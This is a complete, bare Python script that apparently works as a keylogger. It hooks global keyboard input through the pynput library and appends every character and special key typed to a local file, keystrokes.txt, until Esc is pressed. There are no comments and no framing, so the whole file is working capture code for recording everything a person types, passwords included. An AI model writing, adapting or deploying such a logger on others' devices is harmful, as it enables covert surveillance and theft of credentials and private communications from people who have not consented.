from pynput.keyboard import Listener, Key
log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
